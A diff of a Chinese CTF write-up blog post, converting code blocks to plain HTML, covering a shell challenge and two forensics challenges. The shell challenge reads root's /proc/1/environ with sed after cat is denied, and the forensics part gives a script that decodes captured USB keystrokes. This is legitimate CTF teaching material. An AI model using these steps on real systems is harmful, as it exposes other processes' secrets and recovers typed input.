*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:</span><br><span class="line">SSH_CONNECTION=127.0.0.1 57394 127.0.0.1 22</span><br><span class="line">USER=tony</span><br><span class="line">PWD=/home/tony</span><br><span class="line">HOME=/home/tony</span><br><span class="line">SSH_CLIENT=127.0.0.1 57394 22</span><br><span class="line">SSH_TTY=/dev/pts/1</span><br><span class="line">MAIL=/var/mail/tony</span><br><span class="line">TERM=xterm</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">SHLVL=1</span><br><span class="line">LOGNAME=tony</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/<span class="built_in">local</span>/games</span><br><span class="line">_=/usr/bin/env</span><br></pre></td></tr></table></figure>
-<p>还是在<code>/proc/1/</code>下查看<code>environ</code>，没有权限。因为我们现在是 tony，直接用 sed 就能查看，得到 flag：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tony@e2797a47d8f5:~$ ps -aux</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root         1  0.0  0.0  18376  3044 pts/0    Ss   11:28   0:00 bash /tmp/42.sh</span><br><span class="line">root        14  0.0  0.0  72296  3356 ?        Ss   11:28   0:00 /usr/sbin/sshd</span><br><span class="line">root        16  0.0  0.0  55952  3300 pts/0    S    11:28   0:00 su -l steve</span><br><span class="line">steve       18  0.0  0.0  18508  3412 pts/0    S    11:28   0:00 -su</span><br><span class="line">steve       64  0.0  0.0  45188  5572 pts/0    S+   11:56   0:00 ssh -i /home/st</span><br><span class="line">root        65  0.0  0.0 103852  7340 ?        Ss   11:56   0:00 sshd: tony [pri</span><br><span class="line">tony        80  0.0  0.0 103852  3528 ?        R    11:56   0:00 sshd: tony@pts/</span><br><span class="line">tony        81  0.0  0.0  18508  3500 pts/1    Ss   11:56   0:00 -bash</span><br><span class="line">tony        91  0.0  0.0  36700  3140 pts/1    R+   11:58   0:00 ps -aux</span><br><span class="line">tony@e2797a47d8f5:~$ cat /proc/1/environ</span><br><span class="line">cat: /proc/1/environ: Permission denied</span><br><span class="line">tony@e2797a47d8f5:~$ sed <span class="string">''</span> /proc/1/environ</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=e2797a47d8f5TERM=xtermflag=b00t2root&#123;1_44aaaaaammmm_gr0000000ooooooOOO7777&#125;HOME=/root</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">tony@e2797a47d8f5:~$ env
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+SSH_CONNECTION=127.0.0.1 57394 127.0.0.1 22
+USER=tony
+PWD=/home/tony
+HOME=/home/tony
+SSH_CLIENT=127.0.0.1 57394 22
+SSH_TTY=/dev/pts/1
+MAIL=/var/mail/tony
+TERM=xterm
+SHELL=/bin/bash
+SHLVL=1
+LOGNAME=tony
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+_=/usr/bin/env
+</code></pre>
+<p>还是在 <code>/proc/1/</code> 下查看 <code>environ</code>，没有权限。因为我们现在是 tony，直接用 sed 就能查看，得到 flag：</p>
+<pre><code class="bash">tony@e2797a47d8f5:~$ ps -aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.0  18376  3044 pts/0    Ss   11:28   0:00 bash /tmp/42.sh
+root        14  0.0  0.0  72296  3356 ?        Ss   11:28   0:00 /usr/sbin/sshd
+root        16  0.0  0.0  55952  3300 pts/0    S    11:28   0:00 su -l steve
+steve       18  0.0  0.0  18508  3412 pts/0    S    11:28   0:00 -su
+steve       64  0.0  0.0  45188  5572 pts/0    S+   11:56   0:00 ssh -i /home/st
+root        65  0.0  0.0 103852  7340 ?        Ss   11:56   0:00 sshd: tony [pri
+tony        80  0.0  0.0 103852  3528 ?        R    11:56   0:00 sshd: tony@pts/
+tony        81  0.0  0.0  18508  3500 pts/1    Ss   11:56   0:00 -bash
+tony        91  0.0  0.0  36700  3140 pts/1    R+   11:58   0:00 ps -aux
+tony@e2797a47d8f5:~$ cat /proc/1/environ
+cat: /proc/1/environ: Permission denied
+tony@e2797a47d8f5:~$ sed &#39;&#39; /proc/1/environ
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=e2797a47d8f5TERM=xtermflag=b00t2root{1_44aaaaaammmm_gr0000000ooooooOOO7777}HOME=/root
+</code></pre>
 <h1 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h1><h2 id="key-me-baby"><a href="#key-me-baby" class="headerlink" title="key_me_baby"></a>key_me_baby</h2><p>用 wireshark 打开后发现都是 usb 流量。用 tshark 把流量导出（中间几个 grep 把非 usb 流量筛选掉）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r data.pcapng -T fields -e usb.capdata | grep -E <span class="string">"^.&#123;23&#125;$"</span> | grep -v 00:00:00:00:00:00:00:00 &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">tshark -r data.pcapng -T fields -e usb.capdata | grep -E &quot;^.{23}$&quot; | grep -v 00:00:00:00:00:00:00:00 &gt; usbdata.txt
+</code></pre>
 <p>然后用脚本跑（之前 XMan 个人赛的时候用过的脚本）：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">'2'</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">'2'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">'[unknown]'</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">""</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">'&lt;DEL&gt;'</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">"&lt;CAP&gt;"</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'output :'</span> + <span class="string">""</span>.join(output))</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+normalKeys = {&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;}
+shiftKeys = {&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;{&quot;,&quot;30&quot;:&quot;}&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;}
+output = []
+keys = open(&#39;usbdata.txt&#39;)
+for line in keys:
+    try:
+        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:
+             continue
+        if line[6:8] in normalKeys.keys():
+            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]
+        else:
+            output += [&#39;[unknown]&#39;]
+    except:
+        pass
+keys.close()
+
+flag=0
+print(&quot;&quot;.join(output))
+for i in range(len(output)):
+    try:
+        a=output.index(&#39;&lt;DEL&gt;&#39;)
+        del output[a]
+        del output[a-1]
+    except:
+        pass
+for i in range(len(output)):
+    try:
+        if output[i]==&quot;&lt;CAP&gt;&quot;:
+            flag+=1
+            output.pop(i)
+            if flag==2:
+                flag=0
+        if flag!=0:
+            output[i]=output[i].upper()
+    except:
+        pass
+print (&#39;output :&#39; + &quot;&quot;.join(output))
+</code></pre>
 <h2 id="loopback"><a href="#loopback" class="headerlink" title="loopback"></a>loopback</h2><p>追踪 tcp 流，把服务器传回客户端的文件导出后，得到一张图片。strings 一下得到 flag：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ strings data.png</span><br><span class="line">...</span><br><span class="line">B00t2root&#123;i_am_the_flag_format&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">$ strings data.png
+...
+B00t2root{i_am_the_flag_format}
+</code></pre>
